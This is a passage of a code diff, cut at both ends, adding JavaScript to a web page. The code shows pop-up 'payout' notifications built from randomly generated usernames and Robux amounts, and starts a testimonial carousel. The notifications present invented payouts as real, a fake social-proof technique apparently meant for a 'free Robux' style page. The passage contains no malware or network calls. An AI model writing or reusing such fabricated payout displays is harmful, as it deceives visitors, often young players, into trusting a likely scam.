+        container.innerHTML = "";
+        const username = generateRandomUsername();
+        const amount = generateRandomRobuxAmount();
+        const notification = document.createElement("div");
+        notification.className = "payout-notification";
+        notification.innerHTML = `<div class="payout-username">${username}</div><div class="payout-amount">+${amount.toLocaleString()} R$</div>`;
+        container.appendChild(notification);
+        setTimeout(() => notification.remove(), 6000);
+      }
+
+      let currentSlide = 0;
+      const totalSlides = 3;
+
+      function moveToSlide(slideIndex) {
+        if (slideIndex >= 0 && slideIndex < totalSlides) {
+          currentSlide = slideIndex;
+          updateCarousel();
+        }
+      }
+
+      function updateCarousel() {
+        const carousel = document.getElementById("testimonial
